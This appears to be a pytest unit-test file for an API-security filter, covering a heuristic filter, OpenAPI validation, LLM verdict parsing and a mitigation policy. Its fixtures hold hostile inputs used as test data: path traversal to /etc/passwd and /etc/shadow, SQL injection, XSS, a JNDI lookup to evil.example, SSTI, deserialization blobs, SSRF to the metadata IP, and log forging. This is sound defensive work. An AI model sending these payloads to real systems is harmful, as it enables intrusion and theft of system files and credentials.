"""Unit tests for the synchronous filter, schema index, verdict parsing, and mitigation policy."""

from __future__ import annotations

import base64
import json
import re
from pathlib import Path

import numpy as np
import pytest

import asyncio

import httpx

from app.agent_worker import (
    LLMError,
    MetaModelClient,
    MitigationPolicy,
    build_messages,
    investigate,
    normalize_threat_type,
    parse_verdict,
)
from app.ml_filter import FastFilter, describe_decodings, heuristic_template, needs_inline_hold
from app.authz import extract_principal, json_owner_mismatch, user_scoped_mismatch
from app.rag_engine import ParamSpec, RouteSpec, needs_agent_review, review_classes
from app.models import Action, AgentVerdict, FastVerdict, RequestFeatures, SuspiciousRequest, Tier
from app.rag_engine import (
    OpenAPIError,
    RagContext,
    RouteIndex,
    load_schema_document,
    parse_routes,
    undeclared_body_fields,
    validate_against_spec,
)

DEMO_SCHEMA = Path(__file__).resolve().parent.parent / "examples" / "demo_openapi.yaml"


@pytest.fixture(scope="module")
def ff() -> FastFilter:
    return FastFilter(suspicious_threshold=0.45, hard_block_threshold=0.9, bola_distinct_threshold=15)


@pytest.fixture(scope="module")
def routes() -> RouteIndex:
    index = RouteIndex()
    index.replace_source("demo", parse_routes(load_schema_document(DEMO_SCHEMA.read_bytes()), "demo"))
    return index


def verdict_for(ff: FastFilter, method: str, path: str, query: str = "", body: bytes = b"", **kw) -> FastVerdict:
    distinct = kw.pop("distinct_objects", 0)
    return ff.evaluate(ff.extract_features(method, path, query, body, window_rate=3, **kw), distinct_objects=distinct)


# ---------------------------------------------------------------------- fast filter


@pytest.mark.parametrize(
    ("method", "path", "query", "body"),
    [
        ("GET", "/api/users/42", "page=2", b""),
        ("GET", "/api/orders", "status=open&page=1", b""),
        ("POST", "/api/orders", "", b'{"item":"book","qty":2,"note":"don\'t ring the bell"}'),
        ("GET", "/static/app.v2.min.js", "", b""),
        ("GET", "/config.env.json", "", b""),
    ],
)
def test_benign_requests_are_clean(ff: FastFilter, method: str, path: str, query: str, body: bytes) -> None:
    assert verdict_for(ff, method, path, query, body).tier is Tier.CLEAN


@pytest.mark.parametrize(
    ("path", "query"),
    [
        ("/api/files", "name=../../etc/passwd"),
        ("/api/files", "name=..%2f..%2f..%2fwindows/win.ini"),
        ("/files/%252e%252e%252fetc%252fpasswd", ""),
        ("/download/%2e%2e%5c%2e%2e%5cboot.ini", ""),
        ("/api/files", "name=report.pdf%00.png"),
        ("/api/files", "name=file:///etc/hosts"),
        ("/static/..%c0%af..%c0%afetc/shadow", ""),
    ],
)
def test_path_traversal_variants_hard_block(ff: FastFilter, path: str, query: str) -> None:
    v = verdict_for(ff, "GET", path, query)
    assert v.tier is Tier.HARD_BLOCK
    assert v.threat_hint == "path_traversal"


def test_traversal_in_json_body_is_blocked(ff: FastFilter) -> None:
    v = verdict_for(ff, "POST", "/api/export", body=b'{"template":"../../../../etc/passwd"}')
    assert v.tier is Tier.HARD_BLOCK


def test_sql_reserved_word_is_suspicious_not_hard_blocked(ff: FastFilter) -> None:
    stacked = verdict_for(ff, "GET", "/chambers", "offset=0; DROP TABLE chambers;--")
    assert stacked.tier is Tier.SUSPICIOUS
    assert stacked.tier is not Tier.HARD_BLOCK
    assert stacked.score < 0.6
    assert "sql keyword" in stacked.reasons[0]
    union = verdict_for(ff, "GET", "/chambers", "limit=10 UNION SELECT 1,2,3--")
    assert union.tier is Tier.SUSPICIOUS
    assert union.tier is not Tier.HARD_BLOCK
    ordinary = verdict_for(ff, "GET", "/chambers", "limit=10&offset=0")
    assert ordinary.tier is Tier.CLEAN
    inside_word = verdict_for(ff, "POST", "/chambers", body=b'{"name":"selection chamber"}')
    assert inside_word.tier is Tier.CLEAN


def test_quoted_string_tautology_is_suspicious(ff: FastFilter) -> None:
    body = "{\"username\": \"admin' OR 'a'='a'\", \"password\": \"pwd\"}".encode()
    v = verdict_for(ff, "POST", "/sessions", body=body)
    assert v.tier is Tier.SUSPICIOUS
    assert v.threat_hint == "injection"
    assert v.tier is not Tier.HARD_BLOCK
    plain = verdict_for(ff, "POST", "/sessions", body=b'{"username":"aris","password":"secretpassword1"}')
    assert plain.tier is Tier.CLEAN


def test_json_escaped_newline_with_audit_stamp_is_log_forging(ff: FastFilter) -> None:
    body = b'{"material":"silver\\n2026-10-28 11:07:00 [AUDIT] Privilege escalation detected"}'
    v = verdict_for(ff, "POST", "/artifacts", body=body)
    assert v.tier is Tier.SUSPICIOUS
    assert v.threat_hint == "log_forging"


def test_unquoted_or_tautology_in_a_query_is_suspicious(ff: FastFilter) -> None:
    v = verdict_for(ff, "GET", "/missions", "offset=0+OR+1%3D1")
    assert v.tier is Tier.SUSPICIOUS
    assert v.tier is not Tier.HARD_BLOCK
    v = verdict_for(ff, "GET", "/missions", "status=completed%27+OR+%271%27%3D%271")
    assert v.tier is Tier.SUSPICIOUS
    assert v.tier is not Tier.HARD_BLOCK


def test_injection_is_suspicious_not_hard_blocked(ff: FastFilter) -> None:
    v = verdict_for(ff, "POST", "/login", body=b'{"user":"admin\' OR 1=1 --"}')
    assert v.tier is Tier.SUSPICIOUS
    assert v.threat_hint == "injection"


@pytest.mark.parametrize(
    ("query", "body", "headers"),
    [
        ("q=%3Cimg%20src%3Dx%20onmouseover%3Dalert(1)%3E", b"", None),
        ("q=${lower:j}ndi:ldap://evil.example/a", b"", None),
        ("user=alice%0aINFO+admin+logged+in", b"", None),
        ("", b'{"note":"{{7*7}}"}', None),
        ("", b'{"blob":"gASVBAAAAAAAAACMCGJ1aWx0aW5z"}', None),
        ("", b'{"name":"O:8:\\"stdClass\\":0:{}"}', None),
        ("url=http://169.254.169.254/latest/meta-data/", b"", None),
        ("url=http://10.0.0.5/admin", b"", None),
        ("", b"", {"cookie": "session=gASVBAAAAAAAAACMCG=="}),
    ],
)
def test_new_attack_families_are_suspicious_not_hard_blocked(
    ff: FastFilter, query: str, body: bytes, headers: dict[str, str] | None
) -> None:
    v = verdict_for(ff, "POST", "/api/comments", query, body, headers=headers)
    assert v.tier is Tier.SUSPICIOUS
    assert v.tier is not Tier.HARD_BLOCK


def test_newline_without_a_log_stamp_is_not_log_forging(ff: FastFilter) -> None:
    plain = verdict_for(ff, "GET", "/stations/public", "region=North%0Azone")
    assert plain.threat_hint != "log_forging"
    stamped = verdict_for(ff, "GET", "/stations/public", "region=North%0A[INFO]+admin+logged+in")
    assert stamped.tier is Tier.SUSPICIOUS
    assert stamped.threat_hint == "log_forging"


def test_newline_in_free_text_body_is_not_a_hard_block(ff: FastFilter) -> None:
    v = verdict_for(ff, "POST", "/api/comments", body=b'{"order_id":1,"text":"hello\nplease leave it at the door"}')
    assert v.tier is not Tier.HARD_BLOCK
    assert v.threat_hint != "log_forging"


def test_describe_decodings_returns_text_and_does_not_execute() -> None:
    encoded = base64.b64encode(b"os.system('id')").decode()
    text = describe_decodings(encoded)
    assert "base64: os.system('id')" in text
    assert describe_decodings("%2e%2e%2fetc%2fpasswd").splitlines()[0].endswith("../etc/passwd")


def test_schema_violation_and_bola_signals(ff: FastFilter) -> None:
    assert verdict_for(ff, "DELETE", "/api/users/42", route_known=False).threat_hint == "schema_violation"
    bola = verdict_for(ff, "GET", "/api/orders/77", distinct_objects=20)
    assert bola.tier is Tier.SUSPICIOUS and bola.threat_hint == "bola"


def test_privileged_mass_assignment_is_suspicious(ff: FastFilter) -> None:
    v = verdict_for(ff, "PATCH", "/api/users/1", undeclared_fields=["role"], privileged_fields=["role"])
    assert v.tier is Tier.SUSPICIOUS and v.threat_hint == "mass_assignment"


def test_inline_hold_is_only_for_irreversible_signals() -> None:
    comment = RequestFeatures(method="POST", path="/api/comments")
    assert needs_inline_hold(comment, method="POST") is False
    injection = RequestFeatures(method="POST", path="/api/comments", injection_hits=1)
    assert needs_inline_hold(injection, method="POST") is True
    privileged = RequestFeatures(method="PATCH", path="/api/users/1", privileged_fields=["role"])
    assert needs_inline_hold(privileged, method="PATCH") is True
    watched_read = RequestFeatures(method="GET", path="/api/users/1")
    assert needs_inline_hold(watched_read, method="GET", watched=True) is False
    watched_write = RequestFeatures(method="PATCH", path="/api/users/1")
    assert needs_inline_hold(watched_write, method="PATCH", watched=True) is True


def test_compiled_forest_matches_sklearn() -> None:
    from sklearn.ensemble import IsolationForest

    from app.ml_filter import CompiledIsolationForest, _benign_training_set

    rows = _benign_training_set(n=80, seed=7)
    forest = IsolationForest(n_estimators=8, max_samples=32, random_state=7)
    forest.fit(rows)
    compiled = CompiledIsolationForest(forest)
    rng = np.random.default_rng(7)
    for _ in range(20):
        row = tuple(float(x) for x in rng.uniform(0, 6, size=9))
        expected = -forest.score_samples(np.array([row]))[0]
        assert compiled.anomaly_score(row) == pytest.approx(expected, rel=1e-9)


def test_review_classes_follow_the_operation_shape() -> None:
    login = RouteSpec("POST", "/auth/login", "x", re.compile(""), [], body_fields=["username", "password"])
    assert review_classes(login) == frozenset()
    read = RouteSpec("GET", "/missions/{missionId}", "x", re.compile(""), ["missionId"])
    assert review_classes(read) == frozenset({"object_access"})
    assert needs_agent_review(read, 1) is False
    assert needs_agent_review(read, 2) is True
    note = RouteSpec("POST", "/missions", "x", re.compile(""), [], body_fields=["name", "locationName"])
    assert "free_text" in review_classes(note)
    assert needs_agent_review(note, 0) is True
    link = RouteSpec("POST", "/files", "x", re.compile(""), [], body_fields=["fileUrl"])
    assert "url_or_file" in review_classes(link)
    files = RouteSpec(
        "GET", "/api/files", "x", re.compile(""), [], params=[ParamSpec(name="name", location="query")]
    )
    assert "url_or_file" in review_classes(files)
    assert needs_agent_review(read, 1, identity_mismatch=True) is True


def test_heuristic_template_extracts_object_ids() -> None:
    assert heuristic_template("/api/orders/123/items/9f1c2d3e-0000-4000-8000-1234567890ab") == (
        "/api/orders/{id}/items/{id}",
        "9f1c2d3e-0000-4000-8000-1234567890ab",
    )
    assert heuristic_template("/api/orders") == ("/api/orders", None)


# ---------------------------------------------------------------------- OpenAPI index and validation


def test_match_reports_every_method_on_the_template(routes: RouteIndex) -> None:
    found = routes.match("GET", "/api/users/42")
    assert found is not None and found.method_allowed
    assert set(found.allowed_methods) == {"GET", "PATCH"}
    denied = routes.match("DELETE", "/api/users/42")
    assert denied is not None and not denied.method_allowed
    assert set(denied.allowed_methods) == {"GET", "PATCH"}


def test_route_index_matches_templates_and_methods(routes: RouteIndex) -> None:
    known = routes.classify("GET", "/api/users/42")
    assert (known.known, known.template, known.object_id) == (True, "/api/users/{userId}", "42")
    assert routes.classify("DELETE", "/api/users/42").known is False
    assert routes.classify("GET", "/api/admin/export").known is False
    assert routes.classify("GET", "/api/orders").known is True
    assert RouteIndex().classify("GET", "/anything/5").known is None


def test_swagger2_base_path_and_body_params() -> None:
    doc = load_schema_document(
        json.dumps(
            {
                "swagger": "2.0",
                "basePath": "/v2",
                "paths": {
                    "/payments": {
                        "post": {
                            "parameters": [
                                {"name": "body", "in": "body", "schema": {"properties": {"amount": {}, "currency": {}}}}
                            ]
                        }
                    }
                },
            }
        )
    )
    (route,) = parse_routes(doc, "legacy")
    assert route.template == "/v2/payments"
    assert route.body_fields == ["amount", "currency"]


def test_invalid_schema_documents_are_rejected() -> None:
    with pytest.raises(OpenAPIError):
        load_schema_document("just: yaml")
    with pytest.raises(OpenAPIError):
        load_schema_document('{"openapi": "3.0.0", "paths": {}}')


def test_schema_validation_findings(routes: RouteIndex) -> None:
    match = routes.match("GET", "/api/users/..%2f..")
    findings = validate_against_spec(match, "debug=1", "", schema_loaded=True)
    assert any("expects integer" in f for f in findings)
    assert any("undeclared query parameters: debug" in f for f in findings)

    enum_findings = validate_against_spec(routes.match("GET", "/api/orders"), "status=deleted", "", True)
    assert any("outside the declared enum" in f for f in enum_findings)

    assert validate_against_spec(None, "", "", True)[0].startswith("path is not declared")


def test_undeclared_body_fields(routes: RouteIndex) -> None:
    spec = routes.classify("PATCH", "/api/users/1").spec
    undeclared, privileged = undeclared_body_fields(spec, b'{"display_name":"a","is_admin":true,"x":1}', "application/json")
    assert undeclared == ["is_admin", "x"]
    assert privileged == ["is_admin"]
    assert undeclared_body_fields(spec, b'{"display_name":"a"}', "application/json") == ([], [])
    assert undeclared_body_fields(spec, b"not json", "application/json") == ([], [])


# ---------------------------------------------------------------------- verdict parsing


def test_parse_plain_json_verdict() -> None:
    v = parse_verdict('{"is_malicious": true, "confidence_score": 0.93, "threat_type": "Path Traversal", "reasoning": "x"}')
    assert v == AgentVerdict(is_malicious=True, confidence_score=0.93, threat_type="path_traversal", reasoning="x")


def test_parse_verdict_with_fences_reasoning_and_coercion() -> None:
    raw = (
        "<think>The request has {braces} and looks odd.</think>\n"
        "Here is my answer:\n```json\n"
        '{"is_malicious": "true", "confidence_score": 87, "threat_type": "IDOR", "reasoning": "enumeration"}\n```'
    )
    v = parse_verdict(raw)
    assert v is not None
    assert v.is_malicious is True
    assert v.confidence_score == pytest.approx(0.87)
    assert v.threat_type == "bola"


def test_parse_verdict_rejects_unusable_output() -> None:
    assert parse_verdict("I think it is malicious.") is None
    assert parse_verdict('{"confidence_score": 0.9}') is None
    assert parse_verdict('{"is_malicious": "maybe", "confidence_score": 0.9, "threat_type": "bola"}') is None
    assert parse_verdict('{"is_malicious": true, "confidence_score": 0.9}') is None
    assert parse_verdict('{"is_malicious": true, "confidence_score": 1e309, "threat_type": "bola"}') is None
    assert parse_verdict('{"is_malicious": 2, "confidence_score": 0.9, "threat_type": "bola"}') is None


def test_prompt_omits_fast_score_unless_requested() -> None:
    request = _req()
    hidden = build_messages(request, [], _ctx())
    shown = build_messages(request, [], _ctx(), include_fast_score=True)
    assert "score=" not in hidden[1]["content"]
    assert "score=0.60" in shown[1]["content"]


def test_parse_recommended_action() -> None:
    verdict = parse_verdict(
        '{"is_malicious": true, "confidence_score": 0.85, "recommended_action": "alert", '
        '"threat_type": "api_intrusion", "reasoning": "undeclared method"}'
    )
    assert verdict is not None
    assert verdict.recommended_action == "alert"


def test_normalize_threat_type() -> None:
    assert normalize_threat_type("Directory-Traversal") == "path_traversal"
    assert normalize_threat_type("sql_injection") == "injection"
    assert normalize_threat_type("something new") == "other"


# ---------------------------------------------------------------------- mitigation policy


def _req(tier: Tier = Tier.SUSPICIOUS) -> SuspiciousRequest:
    return SuspiciousRequest(
        client_ip="203.0.113.7",
        method="GET",
        path="/api/orders/5",
        features=RequestFeatures(method="GET", path="/api/orders/5"),
        fast_verdict=FastVerdict(tier=tier, score=0.6),
    )


def _ctx(findings: list[str] | None = None) -> RagContext:
    return RagContext(True, "/api/orders/{orderId}", findings or ["matches declared operation"], [], [])


def test_empty_model_message_is_resent_up_to_three_times() -> None:
    calls = {"n": 0}

    def handler(request: httpx.Request) -> httpx.Response:
        calls["n"] += 1
        content = "" if calls["n"] < 3 else "sentinel-ok"
        return httpx.Response(200, json={"choices": [{"message": {"role": "assistant", "content": content}}]})

    async def run() -> str:
        client = MetaModelClient(
            api_key="test",
            base_url="http://llm.test/v1",
            model="muse-spark-1.3",
            max_retries=2,
            transport=httpx.MockTransport(handler),
        )
        try:
            return await client.complete([{"role": "user", "content": "ping"}])
        finally:
            await client.aclose()

    assert asyncio.run(run()) == "sentinel-ok"
    assert calls["n"] == 3


_VERDICT_JSON = '{"is_malicious": true, "confidence_score": 0.91, "threat_type": "injection", "reasoning": "stacked sql"}'
_CHAIN = "request: post\nschema: declared\ntechnique: sql\nconclusion: malicious"


def test_investigate_stops_after_two_tool_calls() -> None:
    class FakeModel:
        def __init__(self) -> None:
            self.calls = 0

        async def chat(self, messages, tools=None, tool_choice=None):
            self.calls += 1
            last = str(messages[-1].get("content") or "")
            if "ONLY one JSON" in last or "not a verdict" in last:
                return {"content": _VERDICT_JSON}
            if tools is not None and self.calls <= 2:
                name = "search_threats" if self.calls == 1 else "get_endpoint"
                arguments = '{"query": "DROP TABLE"}' if name == "search_threats" else '{"method": "POST", "path": "/api/tickets"}'
                return {"content": "", "tool_calls": [{"id": f"t{self.calls}", "type": "function", "function": {"name": name, "arguments": arguments}}]}
            return {"content": _CHAIN}

    class StubRag:
        def search_threats(self, query: str, k: int = 3) -> list[str]:
            return [f"sql doc for {query}"]

        def describe_endpoint(self, method: str, path: str) -> list[str]:
            return [f"{method} {path}"]

    model = FakeModel()
    verdict, _raw, trace, error, chain = asyncio.run(investigate(model, StubRag(), [{"role": "user", "content": "check"}]))
    assert error is None
    assert verdict.is_malicious
    assert chain == _CHAIN
    assert trace == ['search_threats:{"query": "DROP TABLE"}', 'get_endpoint:{"method": "POST", "path": "/api/tickets"}']
    assert model.calls == 4


def test_investigate_stops_after_three_tool_calls() -> None:
    class FakeModel:
        def __init__(self) -> None:
            self.calls = 0

        async def chat(self, messages, tools=None, tool_choice=None):
            self.calls += 1
            last = str(messages[-1].get("content") or "")
            if "ONLY one JSON" in last or "not a verdict" in last:
                return {"content": _VERDICT_JSON}
            if tools is None:
                return {"content": _CHAIN}
            names = ("decode_value", "search_threats", "get_endpoint")
            name = names[min(self.calls, 3) - 1]
            if name == "decode_value":
                arguments = '{"value": "%2e%2e%2fetc%2fpasswd"}'
            elif name == "search_threats":
                arguments = '{"query": "template expression"}'
            else:
                arguments = '{"method": "POST", "path": "/api/tickets"}'
            return {
                "content": "",
                "tool_calls": [{"id": f"t{self.calls}", "type": "function", "function": {"name": name, "arguments": arguments}}],
            }

    class StubRag:
        def search_threats(self, query: str, k: int = 3) -> list[str]:
            return [f"doc {query}"]

        def describe_endpoint(self, method: str, path: str) -> list[str]:
            return [f"{method} {path}"]

    model = FakeModel()
    verdict, _raw, trace, error, _chain = asyncio.run(investigate(model, StubRag(), [{"role": "user", "content": "check"}]))
    assert error is None and verdict.is_malicious
    assert len(trace) == 3
    assert trace[0].startswith("decode_value:")
    assert model.calls == 5


def test_investigate_corrects_a_non_json_verdict() -> None:
    class FakeModel:
        def __init__(self) -> None:
            self.calls = 0

        async def chat(self, messages, tools=None, tool_choice=None):
            self.calls += 1
            if tools is not None:
                return {"content": _CHAIN}
            if self.calls == 2:
                return {"content": "I think this is bad."}
            return {"content": _VERDICT_JSON}

    class StubRag:
        def search_threats(self, query: str, k: int = 3) -> list[str]:
            return []

        def describe_endpoint(self, method: str, path: str) -> list[str]:
            return []

    verdict, _raw, _trace, error, chain = asyncio.run(investigate(FakeModel(), StubRag(), [{"role": "user", "content": "check"}]))
    assert error is None
    assert verdict.confidence_score == 0.91
    assert chain == _CHAIN


def test_investigate_falls_back_when_the_model_never_answers() -> None:
    class DeadModel:
        async def chat(self, messages, tools=None, tool_choice=None):
            raise LLMError("model call failed after 3 attempts: empty")

    class StubRag:
        def search_threats(self, query: str, k: int = 3) -> list[str]:
            return []

        def describe_endpoint(self, method: str, path: str) -> list[str]:
            return []

    hard, _raw, _trace, error, _chain = asyncio.run(
        investigate(DeadModel(), StubRag(), [{"role": "user", "content": "check"}], req=_req(Tier.HARD_BLOCK))
    )
    assert error is not None and error.startswith("fallback:")
    assert hard.recommended_action == "block"
    assert hard.confidence_score == 0.95
    policy = MitigationPolicy(block_confidence=0.85, critical_confidence=0.7)
    action, _ = policy.decide(hard, _req(Tier.HARD_BLOCK), _ctx())
    assert action is Action.BLOCKLISTED

    soft, _raw, _trace, error, _chain = asyncio.run(
        investigate(DeadModel(), StubRag(), [{"role": "user", "content": "check"}], req=_req(Tier.SUSPICIOUS))
    )
    assert error is not None and error.startswith("fallback:")
    assert soft.confidence_score == 0.55
    action, _ = policy.decide(soft, _req(Tier.SUSPICIOUS), _ctx())
    assert action is Action.ALERT


@pytest.mark.parametrize(
    ("verdict", "findings", "tier", "expected"),
    [
        (None, None, Tier.SUSPICIOUS, Action.ALERT),
        (AgentVerdict(is_malicious=False, confidence_score=0.9), None, Tier.SUSPICIOUS, Action.IGNORED),
        (AgentVerdict(is_malicious=True, confidence_score=0.9, threat_type="other"), None, Tier.SUSPICIOUS, Action.BLOCKLISTED),
        (AgentVerdict(is_malicious=True, confidence_score=0.75, threat_type="bola"), None, Tier.SUSPICIOUS, Action.BLOCKLISTED),
        (AgentVerdict(is_malicious=True, confidence_score=0.75, threat_type="xss"), None, Tier.SUSPICIOUS, Action.BLOCKLISTED),
        (AgentVerdict(is_malicious=True, confidence_score=0.75, threat_type="log_forging"), None, Tier.SUSPICIOUS, Action.ALERT),
        (AgentVerdict(is_malicious=True, confidence_score=0.75, threat_type="other"), None, Tier.SUSPICIOUS, Action.ALERT),
        (
            AgentVerdict(is_malicious=True, confidence_score=0.65, threat_type="api_intrusion"),
            ["method not declared for /api/files; allowed: GET"],
            Tier.SUSPICIOUS,
            Action.BLOCKLISTED,
        ),
        (
            AgentVerdict(is_malicious=True, confidence_score=0.75, threat_type="mass_assignment"),
            ["undeclared body fields (possible mass assignment): role"],
            Tier.SUSPICIOUS,
            Action.BLOCKLISTED,
        ),
        (
            AgentVerdict(is_malicious=True, confidence_score=0.9, threat_type="mass_assignment"),
            ["undeclared body fields (possible mass assignment): owner"],
            Tier.SUSPICIOUS,
            Action.BLOCKLISTED,
        ),
        (
            AgentVerdict(is_malicious=True, confidence_score=0.7, threat_type="mass_assignment"),
            ["undeclared body fields (possible mass assignment): owner"],
            Tier.SUSPICIOUS,
            Action.ALERT,
        ),
        (AgentVerdict(is_malicious=True, confidence_score=0.72, threat_type="other"), None, Tier.HARD_BLOCK, Action.BLOCKLISTED),
        (AgentVerdict(is_malicious=True, confidence_score=0.5, threat_type="path_traversal"), None, Tier.HARD_BLOCK, Action.ALERT),
    ],
)
def test_mitigation_policy(verdict: AgentVerdict | None, findings: list[str] | None, tier: Tier, expected: Action) -> None:
    policy = MitigationPolicy(block_confidence=0.85, critical_confidence=0.7)
    req = _req(tier)
    if findings and any(name in " ".join(findings) for name in ("role", "is_admin", "permissions", "balance")):
        req.features.privileged_fields = ["role"]
    action, _ = policy.decide(verdict, req, _ctx(findings))
    assert action is expected


def test_principal_and_owner_helpers() -> None:
    assert extract_principal("Bearer user-51") == "51"
    payload = base64.urlsafe_b64encode(json.dumps({"sub": "7"}).encode()).rstrip(b"=").decode()
    assert extract_principal(f"Bearer hdr.{payload}.sig") == "7"
    assert user_scoped_mismatch("51", {"userId": "51"}) is False
    assert user_scoped_mismatch("51", {"userId": "52"}) is True
    assert user_scoped_mismatch("51", {"orderId": "11"}) is False
    assert json_owner_mismatch(b'{"id":11,"user_id":1}', "51") is True
    assert json_owner_mismatch(b'{"id":511,"user_id":51}', "51") is False


def test_identity_mismatch_is_suspicious_bola(ff: FastFilter) -> None:
    verdict = ff.evaluate(ff.extract_features("GET", "/api/users/52", "", b""), identity_mismatch=True)
    assert verdict.threat_hint == "bola"
    assert verdict.score == 0.7
    assert verdict.tier is Tier.SUSPICIOUS


def test_policy_blocks_identity_mismatch_even_when_the_model_allows() -> None:
    policy = MitigationPolicy(block_confidence=0.85, critical_confidence=0.7)
    req = _req(Tier.SUSPICIOUS)
    req.identity_mismatch = True
    allowed = AgentVerdict(is_malicious=False, confidence_score=0.05, threat_type="benign")
    action, _ = policy.decide(allowed, req, _ctx())
    assert action is Action.BLOCKLISTED
